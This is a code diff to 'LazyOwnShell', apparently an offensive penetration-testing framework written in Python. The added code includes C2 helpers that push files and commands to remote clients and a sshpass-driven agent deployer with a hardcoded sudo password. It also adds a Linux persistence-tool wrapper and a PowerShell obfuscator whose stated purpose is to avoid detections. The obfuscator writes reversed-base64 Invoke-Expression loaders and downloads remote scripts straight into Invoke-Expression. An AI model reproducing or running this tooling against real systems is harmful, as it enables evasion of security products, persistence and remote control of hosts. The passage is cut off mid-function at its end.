             print_msg("Cloning ad_ldap_enum repository...")
             self.cmd(f"git clone {ad_ldap_enum_git} {ad_ldap_enum_dir}")
-            self.cmd(f"cd {ad_ldap_enum_dir} && python3 -m pip install -r 'requirements.txt'")
+            self.cmd(f"cd {ad_ldap_enum_dir} && python3 -m pip3 install -r 'requirements.txt'")
         else:
             print_msg("ad_ldap_enum already installed, skipping setup.")
 
@@ -18151,7 +18371,7 @@ class LazyOwnShell(cmd2.Cmd):
         try:
             import aclpwn
         except ImportError:
-            self.cmd("pip install aclpwn")
+            self.cmd("pip3 install aclpwn")
         
         path = os.getcwd()
         aclpwn_command = "aclpwn"
@@ -18381,7 +18601,7 @@ class LazyOwnShell(cmd2.Cmd):
         None
         """
         if not is_binary_present("autobloody"):
-            self.cmd("pip install autobloody")
+            self.cmd("pip3 install autobloody")
         domain = self.params["domain"]
         source =  input (f"    [!] Enter the source (Name property in bloodhound default {domain}): ") or domain
         target = input (f"    [!] Enter the target (Name property in bloodhound): ")
@@ -18994,7 +19214,7 @@ class LazyOwnShell(cmd2.Cmd):
         if not os.path.exists(jwt_tool_path):
             print_warn("jwt_tool is not installed. Cloning the repository and installing dependencies.")
             self.cmd(f"git clone {jwt_tool_git} {jwt_tool_path}")
-            self.cmd(f"python3 -m pip install -r {jwt_tool_path}/requirements.txt")
+            self.cmd(f"python3 -m pip3 install -r {jwt_tool_path}/requirements.txt")
             print_msg("jwt_tool installation completed.")
 
         jwt_token = line.strip() if line else input("Enter the JWT token: ").strip()
@@ -19147,6 +19367,7 @@ class LazyOwnShell(cmd2.Cmd):
         print_msg(f"Executing Osmedeus with command: {osmedeus_command}")
         self.cmd(osmedeus_command)
         self.logcsv(f"osmedeus {osmedeus_command}")
+        os.chdir(path)
         return
 
     def do_metabigor(self, line):
@@ -19221,6 +19442,7 @@ class LazyOwnShell(cmd2.Cmd):
         print_msg(f"Executing Metabigor with command: {command}")
         self.cmd(command)
         self.logcsv(f"metabigor {command}")
+        os.chdir(path)
         return
     
     def do_ip2asn(self, line):
@@ -19562,10 +19784,10 @@ class LazyOwnShell(cmd2.Cmd):
         Returns:
         None
         """
+        print_msg("Crafting agent.")
         sessions_path = os.path.join(os.getcwd(), "sessions")
         tmp_path = "/tmp/lazyown_atomic_test"
         self.cmd(f"mkdir -p {tmp_path}")
-        print_msg("Crafting agent.")
         test_scripts = glob.glob(os.path.join(sessions_path, "atomic_test_*.sh")) + glob.glob(os.path.join(sessions_path, "atomic_test_*.ps1"))
         clean_test_scripts = glob.glob(os.path.join(sessions_path, "atomic_clean_test_*.sh")) + glob.glob(os.path.join(sessions_path, "atomic_clean_test_*.ps1"))
 
@@ -19574,13 +19796,17 @@ class LazyOwnShell(cmd2.Cmd):
             return
 
         extension = ".sh" if test_scripts[0].endswith(".sh") else ".ps1"
-
-        atomic_agent_content = "\n".join([f"/bin/sh {os.path.join(tmp_path, os.path.basename(script))}" for script in test_scripts])
+        if extension == ".sh":
+            atomic_agent_content = "\n".join([f"/bin/sh {os.path.join(tmp_path, os.path.basename(script))}" for script in test_scripts])
+        else:
+            atomic_agent_content = "\n".join([f"Start-Process powershell.exe -ArgumentList '-File', 'C:/Users/grisun0/Documents/lazyown_atomic_test/{os.path.basename(script)}' -Verb RunAs" for script in test_scripts])
         atomic_agent_path = os.path.join(tmp_path, f"atomic_agent{extension}")
         with open(atomic_agent_path, "w") as f:
             f.write(atomic_agent_content)
-
-        atomic_clean_agent_content = "\n".join([f"/bin/bash {os.path.join(tmp_path, os.path.basename(script))}" for script in clean_test_scripts])
+        if extension == ".sh":
+            atomic_clean_agent_content = "\n".join([f"/bin/bash {os.path.join(tmp_path, os.path.basename(script))}" for script in clean_test_scripts])
+        else:
+            atomic_clean_agent_content = "\n".join([f"Start-Process powershell.exe -ArgumentList '-File', 'C:/Users/grisun0/Documents/lazyown_atomic_test/{os.path.basename(script)}' -Verb RunAs" for script in clean_test_scripts])
         atomic_clean_agent_path = os.path.join(tmp_path, f"atomic_clean_agent{extension}")
         with open(atomic_clean_agent_path, "w") as f:
             f.write(atomic_clean_agent_content)
@@ -19606,21 +19832,22 @@ class LazyOwnShell(cmd2.Cmd):
         rhost = self.params["rhost"]
         print_msg("Deploying agent.")
         if extension == ".sh":
-            rsync_command = f"sshpass -p '{password}' rsync -avz --progress {tmp_path}/ {username}@{rhost}:/tmp/lazyown_atomic_test && sshpass -p '{password}' ssh {username}@{rhost} 'cd /tmp/lazyown_atomic_test/ && chmod +x /tmp/lazyown_atomic_test/* && sudo -S /tmp/lazyown_atomic_test/atomic_agent.sh'"
+            rsync_command = f"sshpass -p '{password}' scp -r {tmp_path}/ {username}@{rhost}:/tmp/lazyown_atomic_test && sshpass -p '{password}' ssh {username}@{rhost} 'cd /tmp/lazyown_atomic_test/ && chmod +x /tmp/lazyown_atomic_test/* && echo \"grisgrisgris\" | sudo -S /tmp/lazyown_atomic_test/atomic_agent.sh'"
         else:
-            rsync_command = f"smbclient //{rhost}/tmp -U {username}%{password} -c 'put {tmp_path}/*'"
+            rsync_command = f"sshpass -p '{password}' scp -r {tmp_path}/ {username}@{rhost}:C:/Users/grisun0/Documents/ && sshpass -p '{password}' ssh {username}@{rhost} powershell.exe -Command \"Start-Process powershell.exe -ArgumentList '-File', 'C:/Users/grisun0/Documents/lazyown_atomic_test/atomic_agent.ps1' -Verb RunAs\""
         
-        print_msg(rsync_command)
         exit_code = self.cmd(rsync_command)
-        self.logcsv(f"atomic_agent {rsync_command}")
-        input("    [!] Press enter to clean Red Operation: ")
-        if extension == ".sh":
-            rsync_command = f"sshpass -p '{password}' rsync -avz --progress {tmp_path}/ {username}@{rhost}:/tmp/lazyown_atomic_test && sshpass -p '{password}' ssh {username}@{rhost} 'cd /tmp/lazyown_atomic_test/ && chmod +x /tmp/lazyown_atomic_test/* && sudo -S /tmp/lazyown_atomic_test/atomic_clean_agent.sh'"
+        if line.startswith("web"):
+            print_warn("Executing from web. avoid interaction.")
         else:
-            rsync_command = f"smbclient //{rhost}/tmp -U {username}%{password} -c 'put {tmp_path}/*'"
-        
-        print_msg(rsync_command)
-        self.logcsv(f"atomic_agent {rsync_command}")
+            input("    [!] Press enter to clean Red Operation: ")
+        if extension == ".sh":
+            rsync_command = f"sshpass -p '{password}' scp -r {tmp_path}/ {username}@{rhost}:/tmp/lazyown_atomic_test && sshpass -p '{password}' ssh {username}@{rhost} 'cd /tmp/lazyown_atomic_test/ && chmod +x /tmp/lazyown_atomic_test/* && echo \"grisgrisgris\" | sudo -S /tmp/lazyown_atomic_test/atomic_clean_agent.sh'"
+        else:
+            rsync_command = f"sshpass -p '{password}' scp -r {tmp_path}/ {username}@{rhost}:C:/Users/grisun0/Documents/ && sshpass -p '{password}' ssh {username}@{rhost} powershell.exe -Command \"Start-Process powershell.exe -ArgumentList '-File', 'C:/Users/grisun0/Documents/lazyown_atomic_test/atomic_clean_agent.ps1' -Verb RunAs\""
+            
+    
+      
         exit_code = self.cmd(rsync_command)
         
         if exit_code == 0:
@@ -20059,7 +20286,7 @@ class LazyOwnShell(cmd2.Cmd):
         os.makedirs(repo, exist_ok=True)
         if not is_binary_present("pip-compile"):
             print_warn("pip-compile not found in the system. Installing")
-            self.cmd("pip install pip-tools")
+            self.cmd("pip3 install pip-tools")
             
         packages = [
             "requests", "python-libnmap", "pwncat-cs", "pwn", "groq", "PyPDF2", "docx", "python-docx", "olefile",
@@ -20101,12 +20328,13 @@ class LazyOwnShell(cmd2.Cmd):
         trusted-host = {lhost}
         """.replace("    ", ""))
         print_warn("Or you can use this one: ")
-        print_msg(f"pip install <package_name> --index-url http://{lhost}:{port} --trusted-host {lhost}")
+        print_msg(f"pip3 install <package_name> --index-url http://{lhost}:{port} --trusted-host {lhost}")
         server = f"cd {simple} && python3 -m http.server {port}"
         print_msg(server)
         self.cmd(server)
         self.logcsv(f"pip_repo {server}")
         print_warn(f"Shutdown the server at {port}")
+        os.chdir(path)
         return
 
     def do_apt_repo(self, line):
@@ -20284,6 +20512,7 @@ class LazyOwnShell(cmd2.Cmd):
             copy2clip(command)
             self.logcsv(f"apt_repo {command}")
             subprocess.run(f"python3 -m http.server 8009 --directory {repo}", shell=True, check=True)
+            os.chdir(path)
 
         except subprocess.CalledProcessError as e:
             print_error(f"Command failed: {e.cmd}")
@@ -20364,7 +20593,7 @@ class LazyOwnShell(cmd2.Cmd):
                 print_warn("EyeWitness not found. Installing...")
                 os.makedirs(eyewitness_path, exist_ok=True)
                 self.cmd(f"git clone {eyewitness_repo} {eyewitness_path}")
-                self.cmd(f"cd {eyewitness_path}/Python/setup && sudo ./setup.sh && pip install selenium && pip install pyvirtualdisplay")
+                self.cmd(f"cd {eyewitness_path}/Python/setup && sudo ./setup.sh && pip3 install selenium && pip3 install pyvirtualdisplay")
                 print_msg("EyeWitness installed successfully.")
 
             input_file = get_users_dic("txt")
@@ -20616,9 +20845,9 @@ class LazyOwnShell(cmd2.Cmd):
                 print_warn("Default Credentials Cheat Sheet not found. Installing...")
                 os.makedirs(creds_path, exist_ok=True)
                 self.cmd(f"git clone {creds_repo} {creds_path}")
-                self.cmd("pip install tinydb")
-                self.cmd("pip install prettytable")
-                self.cmd("pip install fire")
+                self.cmd("pip3 install tinydb")
+                self.cmd("pip3 install prettytable")
+                self.cmd("pip3 install fire")
                 print_msg("Default Credentials Cheat Sheet installed successfully.")
 
             product = line.strip()
@@ -20968,10 +21197,16 @@ class LazyOwnShell(cmd2.Cmd):
         None
         """
         links = [
+            ("Browser Leaks","https://browserleaks.com/"),
             ("CrackStation", "https://crackstation.net/"),
             ("Codebeautify", "https://codebeautify.org/ntlm-hash-generator"),
             ("CyberChef","https://gchq.github.io/CyberChef/"),
-            ("Mitre Navigator", "https://mitre-attack.github.io/attack-navigator/")
+            ("Ioc", "https://ioc.one/"),
+            ("Ip Info", "https://ipinfo.io/"),
+            ("Mitre Navigator", "https://mitre-attack.github.io/attack-navigator/"),
+            ("Threatfox Abuse", "https://threatfox.abuse.ch/browse/"),
+            ("Threatminer", "https://www.threatminer.org/"),
+            ("Vpn Detector","https://ip.teoh.io/vpn-detection")
         ]
         filtered_links = [(alias, cmd) for alias, cmd in links if line.lower() in alias.lower() or line.lower() in cmd.lower()] if line else links
 
@@ -21030,7 +21265,11 @@ class LazyOwnShell(cmd2.Cmd):
         """
 
         path = os.getcwd()
-        tmp_path = f"{path}/sessions"
+        if line:
+            tmp_path = line.strip()
+        else:
+            tmp_path = f"{path}/sessions"
+
         credentials_path = os.path.join(os.getcwd(), "sessions", "credentials.txt")
         if not os.path.exists(credentials_path):
             username = self.params.get("username") or input("    [!] Enter the username: ")
@@ -21048,7 +21287,7 @@ class LazyOwnShell(cmd2.Cmd):
         rhost = self.params["rhost"]
         print_msg("Deploying sessions directory.")
         
-        rsync_command = f"sshpass -p '{password}' rsync -avz --progress {tmp_path}/ {username}@{rhost}:/home/.grisun0"
+        rsync_command = f"sshpass -p '{password}' scp -r {tmp_path}/ {username}@{rhost}:/home/.grisun0"
         print_msg(rsync_command)
         self.cmd(rsync_command)
         
@@ -21229,7 +21468,7 @@ class LazyOwnShell(cmd2.Cmd):
             if not os.path.exists(dnschef_path):
                 print_msg("DNSChef is not installed. Installing...")
                 self.cmd(f"git clone {dnschef_repo} {dnschef_path}")
-                self.cmd(f"cd {dnschef_path} && pip install -r requirements.txt")
+                self.cmd(f"cd {dnschef_path} && pip3 install -r requirements.txt")
 
             rhost = self.params["rhost"]
             domain = self.params["domain"]
@@ -21344,6 +21583,20 @@ class LazyOwnShell(cmd2.Cmd):
 
     def do_banners(self, line):
         """
+        Extract and display banners from XML files in the 'sessions' directory.
+
+        This function searches for XML files in the 'sessions' directory and extracts banner information from each file.
+        The banner information includes the hostname, port, protocol, extra details, and service. If no XML files are found,
+        an error message is displayed.
+
+        Args:
+            line (str): Not used in this function.
+
+        Returns:
+            None
+
+        Example:
+            banners
         """
         path = os.getcwd()
         sessions_dir = f'{path}/sessions'
@@ -21430,6 +21683,7 @@ class LazyOwnShell(cmd2.Cmd):
 
         Usage:
             bin2shellcode [<filename> [<width> [<quotes> [<format>]]]]
+            bin2shellcode sessions/shellcode.bin 20 True c
         """
         path = os.getcwd()
         default_filename = f"{path}/sessions/shellcode.bin"
@@ -21478,6 +21732,7 @@ class LazyOwnShell(cmd2.Cmd):
                     if quotes:
                         output_file.write('"')
                         print('"')
+                
                     
                 elif format == "nim":
                     output_file.write(f"var shellcode: array[{file_size}, byte] = [\nbyte ")
@@ -21502,8 +21757,980 @@ class LazyOwnShell(cmd2.Cmd):
         except Exception as e:
             print_error(f"Error: {e}")
 
+    def do_news(self, line):
+        """
+        Show the Hacker News in the terminal.
+
+        Parameters:
+            line (str): optional
+        Return None
+        """
+        titles, links, scores = scrape_news()
+        display_news(titles, links, scores)
+        return
+    
+    def do_vulns(self, line):
+        """
+        Scan for vulnerabilities based on a provided service banner.
+
+        This function initializes a vulnerability scanner and searches for CVEs (Common Vulnerabilities and Exposures)
+        related to the specified service banner. If no service banner is provided, it prompts the user to enter one.
+
+        Args:
+            line (str): The service banner to search for vulnerabilities. If not provided, the user will be prompted to enter one.
+
+        Returns:
+            None
+
+        Example:
+            do_vulns "ProFTPD 1.3.5"
+        """
+        scanner = VulnerabilityScanner()
+        if line:
+            servicio = line.strip()
+        else:
+            servicio = input("    [!] Enter the banner to search vulnerability: ") or "ProFTPD 1.3.5"
+
+        cves_encontrados = scanner.search_cves(servicio)
+        scanner.pretty_print(cves_encontrados)
+        return
+
+    def do_exe2bin(self, line):
+        """
+        Trasnform file .exe into binary file.
+
+        Args:
+            line (str): Ruta del archivo ejecutable .exe.
+        
+        Return shellcode.bin file in sessions directory    
+        """
+        if line:
+            input_exe = line.strip()
+        else:
+            input_exe = get_users_dic('exe')
+        path = os.getcwd()
+        output_bin = f"{path}/sessions/shellcode.bin"
+        try:
+            with open(input_exe, 'rb') as exe_file:
+                exe_data = exe_file.read()
+            
+            with open(output_bin, 'wb') as bin_file:
+                bin_file.write(exe_data)
+            
+            print_msg(f"El archivo {input_exe} ha sido convertido a {output_bin}.")
+        except Exception as e:
+            print_error(f"Error: {e}")
+
+    def do_atomic_lazyown(self, line):
+        """
+        Genera y ejecuta pruebas de Atomic Red Team usando el C2.
+
+        Parameters:
+        line (str): Lista de IDs de técnicas separadas por espacios.
+
+        Returns:
+        None
+        """
+        if not line:
+            print_warn("No technique IDs provided.")
+            return
+
+        technique_ids = line.split()
+        for technique_id in technique_ids:
+            self.do_atomic_gen(technique_id)
+
+        sessions_path = os.path.join(os.getcwd(), "sessions")
+        test_scripts = glob.glob(os.path.join(sessions_path, "atomic_test_*.sh")) + glob.glob(os.path.join(sessions_path, "atomic_test_*.ps1"))
+        clean_test_scripts = glob.glob(os.path.join(sessions_path, "atomic_clean_test_*.sh")) + glob.glob(os.path.join(sessions_path, "atomic_clean_test_*.ps1"))
+
+        if not test_scripts or not clean_test_scripts:
+            print_warn("No test or clean test scripts found in the sessions directory.")
+            return
+
+        extension = ".sh" if test_scripts[0].endswith(".sh") else ".ps1"
+        if extension == ".sh":
+            atomic_agent_content = "\n".join([f"/bin/sh {os.path.basename(script)}" for script in test_scripts])
+        else:
+            atomic_agent_content = "\n".join([f"Start-Process powershell.exe -ArgumentList '-File', '{os.path.basename(script)}' -Verb RunAs" for script in test_scripts])
+        atomic_agent_path = os.path.join(sessions_path, f"atomic_agent{extension}")
+        with open(atomic_agent_path, "w") as f:
+            f.write(atomic_agent_content)
+
+        if extension == ".sh":
+            atomic_clean_agent_content = "\n".join([f"/bin/bash {os.path.basename(script)}" for script in clean_test_scripts])
+        else:
+            atomic_clean_agent_content = "\n".join([f"Start-Process powershell.exe -ArgumentList '-File', '{os.path.basename(script)}' -Verb RunAs" for script in clean_test_scripts])
+        atomic_clean_agent_path = os.path.join(sessions_path, f"atomic_clean_agent{extension}")
+        with open(atomic_clean_agent_path, "w") as f:
+            f.write(atomic_clean_agent_content)
+
+        for script in test_scripts + clean_test_scripts + [atomic_agent_path, atomic_clean_agent_path]:
+            self.upload_file_to_c2(script)
+        if extension == ".sh":
+            self.issue_command_to_c2(f"/bin/bash {os.path.basename(atomic_agent_path).replace(sessions_path, '')}")
+        else:
+            self.issue_command_to_c2(f"Start-Process powershell.exe -ArgumentList '-File', '{os.path.basename(atomic_agent_path).replace(sessions_path, '')}' -Verb RunAs")
+        return
+
+
+    def upload_file_to_c2(self, file_path, clientid = ""):
+        """
+        Sube un archivo al C2.
+
+        Parameters:
+        file_path (str): Ruta del archivo a subir.
+
+        Returns:
+        None
+        """
+        if clientid == "":
+            clientid = input (f"    [!] Enter the client id (default {self.c2_clientid}): ") or self.c2_clientid
+        data = {"client_id": clientid}
+        with open(file_path, "rb") as f:
+            files = {"file": f}
+            response = requests.post(f"{self.c2_url}/download_file", auth=self.c2_auth, files=files, data=data)
+            if response.status_code == 200:
+                print_msg(f"File {file_path} uploaded successfully.")
+            else:
+                print_error(f"Failed to upload file {file_path}. Status code: {response.status_code}")
+
+
+    def download_file_from_c2(self, file_name, clientid=""):
+        """
+        Descarga un archivo desde el C2.
+
+        Parameters:
+        file_name (str): Nombre del archivo a descargar.
+        clientid (str): Identificador del cliente (opcional).
+
+        Returns:
+        None
+        """
+        if clientid == "":
+            clientid = input(f"    [!] Enter the client id (default {self.c2_clientid}): ") or self.c2_clientid
+        path = os.getcwd()
+        sessions = f"{path}/sessions/uploads"
+        file_name = os.path.basename(file_name)
+        output = f"{sessions}/{file_name}"
+        command = f"upload:{file_name}"
+        data = {"client_id": clientid, "command": command}
+        response = requests.post(f"{self.c2_url}/issue_command", auth=self.c2_auth, data=data)
+
+        if response.status_code == 200:
+            with open(output, 'wb') as f:
+                f.write(response.content)
+            print_msg(f"File {file_name} downloaded successfully.")
+        else:
+            print_error(f"Failed to download file {file_name}. Status code: {response.status_code}")
+
+    def issue_command_to_c2(self, command):
+        """
+        Ejecuta un comando en el cliente usando el C2.
+
+        Parameters:
+        command (str): Comando a ejecutar.
+
+        Returns:
+        None
+        """
+        clientid = input (f"    [!] Enter the client id (default {self.c2_clientid}): ") or self.c2_clientid
+        data = {"client_id": clientid, "command": command}
+        response = requests.post(f"{self.c2_url}/issue_command", auth=self.c2_auth, data=data)
+        if response.status_code == 200:
+            print_msg(f"Command '{command}' issued successfully.")
+        else:
+            print_error(f"Failed to issue command '{command}'. Status code: {response.status_code}")
+
+    def do_ofuscatorps1(self, line):
+        """
+        Obfuscates a PowerShell script using various techniques.
+        by @JoelGMSec https://github.com/JoelGMSec/Invoke-Stealth/ rewite in python by grisun0
+        This function:
+            - Displays a banner and help information if requested.
+            - Validates the provided parameters.
+            - Executes all obfuscation techniques on the input PowerShell script by default.
+            - Displays the result in the terminal.
+
+        Behavior:
+            - Requires `python3` to be installed for certain techniques.
+            - Uses parameters from the command line for the script path and optional flags.
+
+        Usage:
+            ofuscatorps1 <script_path> [-nobanner]
+
+        Techniques:
+            - Chameleon: Substitute strings and concatenate variables.
+            - BetterXencrypt: Compresses and encrypts with random iterations.
+            - PyFuscation: Obfuscate functions, variables, and parameters.
+            - ReverseB64: Encode with base64 and reverse it to avoid detections.
+            - PSObfuscation: Convert content to bytes and compress with Gzip.
+            - All: Sequentially executes all techniques described above.
+        """
+
+  
+        script_path = get_users_dic("ps1")
+
+        def load_chameleon():
+
+            print_msg("Loading Chameleon and doing some obfuscation.. ")
+            self.cmd(f'python3 ./Resources/Chameleon/chameleon.py -a  {script_path} -o')
+            print_msg("[OK]")
+            if os.path.exists('function_mapping.json'):
+                os.remove('function_mapping.json')
+
+        def load_betterxencrypt():
+
+     
+            print_msg("Loading BetterXencrypt and doing some encryption with random iterations.. ")
+            if os.path.exists('./Resources/BetterXencrypt/BetterXencrypt.ps1'):
+                self.cmd(f'pwsh -Command "Import-Module ./Resources/BetterXencrypt/BetterXencrypt.ps1 -Force; Invoke-BetterXencrypt -InFile {script_path} -OutFile {script_path} -Iterations {random.randint(10, 25)}"')
+            else:
+                self.cmd(f'pwsh -Command "(New-Object System.Net.WebClient).DownloadFile(\'https://raw.githubusercontent.com/JoelGMSec/Invoke-Stealth/main/Resources/BetterXencrypt/BetterXencrypt.ps1\'); Import-Module .\\BetterXencrypt.ps1 -Force; Invoke-BetterXencrypt -InFile {script_path} -OutFile {script_path} -Iterations {random.randint(10, 25)}"')
+            print_msg("[OK]")
+            if os.path.exists('BetterXencrypt.ps1'):
+                os.remove('BetterXencrypt.ps1')
+
+        def load_pyfuscation():
+
+            print_msg("Loading PyFuscation and doing some obfuscation.. ")
+            self.cmd(f'python3 ./Resources/PyFuscation/PyFuscation.py -fvp --ps  {script_path}')
+            pyfuscation_output = f"{os.getcwd()}/Resources/PyFuscation/tmp/script.ps1"
+            if os.path.exists(pyfuscation_output):
+                with open(script_path, 'w') as f:
+                    f.write(open(pyfuscation_output).read())
+            print_msg("[OK]")
+            if os.path.exists('./Resources/PyFuscation/tmp'):
+                self.cmd(f'rm -rf ./Resources/PyFuscation/tmp')
+
+
+            print_msg("Encoding with base64 and reverse it to avoid detections.. ")
+            with open(script_path, 'rb') as f:
+                base64_encoded = base64.b64encode(f.read()).decode()
+            reversed_base64 = base64_encoded[::-1]
+            with open(script_path, 'w') as f:
+                f.write(f'$best64code = "{reversed_base64}";\n')
+                f.write('$base64 = $best64code.ToCharArray(); [array]::Reverse($base64); -join $base64 | out-file $InvokePath\n')
+                f.write('$LoadCode = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("$base64"));\n')
+                f.write('$pwn = iNvoKe-eXPreSsiOn; New-Alias -name pwn -Value $pwn -Force; pwn $LoadCode;\n')
+            print_msg("[OK]")
+
+
+            print_msg("Loading PSObfuscation and randomizing script.. ")
+            if os.path.exists('./Resources/PSObfuscation/Invoke-PSObfuscation.ps1'):
+                self.cmd(f'pwsh -Command "Import-Module ./Resources/PSObfuscation/Invoke-PSObfuscation.ps1 -Force; Invoke-PSObfuscation -Path {script_path} -Comments -Variables -OutFile {script_path}"')
+            else:
+                self.cmd(f'pwsh -Command "(New-Object Net.WebClient).DownloadString(\'https://raw.githubusercontent.com/JoelGMSec/Invoke-Stealth/master/Resources/PSObfuscation/Invoke-PSObfuscation.ps1\') | Invoke-Expression; Invoke-PSObfuscation -Path {script_path} -Comments -Variables -OutFile {script_path}"')
+            print_msg("[OK]")
+
+        def reverse_b64_encoder():
+            print_msg("Encoding with base64 and reverse it to avoid detections.. ")
+            with open(script_path, 'rb') as f:
+                base64_encoded = base64.b64encode(f.read()).decode()
+            reversed_base64 = base64_encoded[::-1]
+            with open(script_path, 'w') as f:
+                f.write(f'$best64code = "{reversed_base64}";\n')
+                f.write('$base64 = $best64code.ToCharArray(); [array]::Reverse($base64); -join $base64 | out-file $InvokePath\n')
+                f.write('$LoadCode = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("$base64"));\n')
+                f.write('$pwn = iNvoKe-eXPreSsiOn; New-Alias -name pwn -Value $pwn -Force; pwn $LoadCode;\n')
+            print_msg("[OK]")
+
+        def load_psobfuscation():
+            print_msg("Loading PSObfuscation and randomizing script.. ")
+            if os.path.exists('./Resources/PSObfuscation/Invoke-PSObfuscation.ps1'):
+                self.cmd(f'pwsh -Command "Import-Module ./Resources/PSObfuscation/Invoke-PSObfuscation.ps1 -Force; Invoke-PSObfuscation -Path {script_path} -Comments -Variables -OutFile {script_path}"')
+            else:
+                self.cmd(f'pwsh -Command "(New-Object Net.WebClient).DownloadString(\'https://raw.githubusercontent.com/JoelGMSec/Invoke-Stealth/master/Resources/PSObfuscation/Invoke-PSObfuscation.ps1\') | Invoke-Expression; Invoke-PSObfuscation -Path {script_path} -Comments -Variables -OutFile {script_path}"')
+            print_msg("[OK]")
+
+        load_chameleon()
+        load_betterxencrypt()
+        load_pyfuscation()
+        reverse_b64_encoder()
+        load_psobfuscation()
+        print_msg("Done!")
+
+
+    def do_d3monizedshell(self, line):
+        """
+        Executes the D3m0n1z3dShell tool for persistence in Linux.
+
+        This function:
+            - Installs D3m0n1z3dShell if not already installed.
+            - Executes the D3m0n1z3dShell command with the provided parameters.
+            - Displays the result in the terminal.
+
+        Behavior:
+            - Requires `git` and `curl` to be installed.
+            - Uses a one-liner installation method for simplicity.
+
+        Usage:
+            d3monizedshell
+        """
+        path = os.getcwd()
+        d3monizedshell_repo = "https://github.com/MatheuZSecurity/D3m0n1z3dShell.git"
+        d3monizedshell_path = os.path.join(path, "external", ".exploit", "D3m0n1z3dShell")
+
+        try:
+            if not os.path.exists(d3monizedshell_path):
+                print_msg("D3m0n1z3dShell is not installed. Installing...")
+                self.cmd(f"git clone {d3monizedshell_repo} {d3monizedshell_path}")
+                self.cmd(f"cd {d3monizedshell_path} && chmod +x demonizedshell.sh")
+
+            command = f"cd {d3monizedshell_path} && sudo ./demonizedshell.sh"
+            self.cmd(command)
+
+        except Exception as e:
+            print_error(f"An error occurred: {e}")
+
+
+    def do_scp(self, line):
+        """
+        Copies the local "sessions" directory to a remote host using scp, leveraging sshpass for automated authentication.
+
+        Steps:
+            1. Verifies if the credentials file exists in the "sessions" directory.
+            If not, prompts the user for a username and password.
+            2. Reads the credentials file if it exists and extracts the username and password.
+            3. Constructs an scp command to deploy the "sessions" directory to the remote host.
+            4. Executes the scp command using the system shell.
+
+        Args:
+            line (str): Input command line (optional). The third parameter can be 'win' or 'lin' to specify the target OS.
+
+        Dependencies:
+            - The `sshpass` command-line tool must be installed on the local machine.
+            - `scp` must be installed on both the local and remote machines.
+            - The remote host must be accessible via SSH.
+
+        Attributes:
+            - `self.params`: Dictionary containing the following keys:
+                - `username` (str, optional): Predefined username. Defaults to prompting the user if not provided.
+                - `password` (str, optional): Predefined password. Defaults to prompting the user if not provided.
+                - `rhost` (str): Remote host's IP or domain name.
+
+        Raises:
+            - KeyError: If `rhost` is not provided in `self.params`.
+            - FileNotFoundError: If the "sessions" directory does not exist.
+
+        Note:
+            - The `credentials.txt` file, if present, should have credentials in the format `username:password`
+            on the first line.
+
+        Returns:
+            None
+        """
+        path = os.getcwd()
+        if line:
+            parts = line.strip().split()
+            tmp_path = parts[0] if parts else f"{path}/sessions"
+            target_os = parts[1] if len(parts) > 1 else None
+        else:
+            tmp_path = f"{path}/sessions"
+            target_os = None
+
+        credentials_path = os.path.join(os.getcwd(), "sessions", "credentials.txt")
+        if not os.path.exists(credentials_path):
+            username = self.params.get("username") or input("    [!] Enter the username: ")
+            password = self.params.get("password") or input("    [!] Enter the password: ")
+        else:
+            with open(credentials_path, "r") as f:
+                credentials = get_credentials()
+                if not credentials:
+                    return
+
+                for user, passwd in credentials:
+                
+                    username = user
+                    password = passwd
+                
+
+        rhost = self.params["rhost"]
+        print_msg("Deploying sessions directory.")
+
+        if target_os not in ["win", "lin"]:
+            target_os = input("    [!] Enter 1 for Windows or 2 for Linux (default is Linux): ").strip() or '2'
+            if target_os == "1":
+                target_os = "win"
+            else:
+                target_os = "lin"
+
+        if target_os == "win":
+            scp_command = f"sshpass -p '{password}' scp -r {tmp_path}/ {username}@{rhost}:C:/Users/grisun0/Documents/ "
+        else:
+            scp_command = f"sshpass -p '{password}' scp -r {tmp_path}/ {username}@{rhost}:/home/.grisun0"
+
+        print_msg(scp_command)
+        self.cmd(scp_command)
+
+        return
+
+    def do_apt_proxy(self, line):
+        """
+        Configures the local machine with internet access to act as an APT proxy for a machine without internet access.
+
+        Steps:
+            1. Installs and configures apt-cacher-ng on the local machine.
+            2. Generates the necessary commands to configure the remote machine to use the proxy.
+            3. Copies the commands to the clipboard using the copy2clip function.
+
+        Parameters:
+            line (str): The IP address of the remote machine without internet access.
+
+        Returns:
+            None
+        """
+        try:
+            print_msg("Installing and configuring apt-cacher-ng...")
+            subprocess.run(["sudo", "apt-get", "update"], check=True)
+            subprocess.run(["sudo", "apt-get", "install", "-y", "apt-cacher-ng"], check=True)
+            subprocess.run(["sudo", "systemctl", "start", "apt-cacher-ng"], check=True)
+            subprocess.run(["sudo", "systemctl", "enable", "apt-cacher-ng"], check=True)
+            if line:
+                remote_ip = line.strip()
+            else:
+                remote_ip = self.params["rhost"]
+            if not remote_ip:
+                print_error("No IP address provided. Please provide the IP address of the remote machine without internet access.")
+                return
+
+            proxy_config = f"Acquire::http::Proxy \"http://{self.params['lhost']}:3142\";"
+            proxy_config_file = "/etc/apt/apt.conf.d/01proxy"
+
+            commands = [
+                f"echo '{proxy_config}' | sudo tee {proxy_config_file}",
+                "sudo apt-get update"
+            ]
+
+            commands_str = "\n".join(commands)
+            copy2clip(commands_str)
+
+            print_msg("APT proxy configured successfully.")
+            print_msg("Commands to configure the remote machine have been copied to the clipboard.")
+
+        except subprocess.CalledProcessError as e:
+            print_error(f"Command failed: {e.cmd}")
+            print_error(f"Output: {e.output}")
+            print_error(f"Return code: {e.returncode}")
+        except Exception as e:
+            print_error(f"An error occurred: {e}")
+
+
+    def do_pip_proxy(self, line):
+        """
+        Configures the local machine with internet access to act as a pip proxy for a machine without internet access.
+
+        Steps:
+            1. Installs and configures squid on the local machine.
+            2. Generates the necessary commands to configure the remote machine to use the proxy.
+            3. Copies the commands to the clipboard using the copy2clip function.
+
+        Parameters:
+            line (str): The IP address of the remote machine without internet access.
+
+        Returns:
+            None
+        """
+        try:
+            print_msg("Installing and configuring squid...")
+            subprocess.run(["sudo", "apt-get", "update"], check=True)
+            subprocess.run(["sudo", "apt-get", "install", "-y", "squid"], check=True)
+            subprocess.run(["sudo", "systemctl", "start", "squid"], check=True)
+            subprocess.run(["sudo", "systemctl", "enable", "squid"], check=True)
+
+            if line:
+                remote_ip = line.strip()
+            else:
+                remote_ip = self.params["rhost"]
+
+            if not remote_ip:
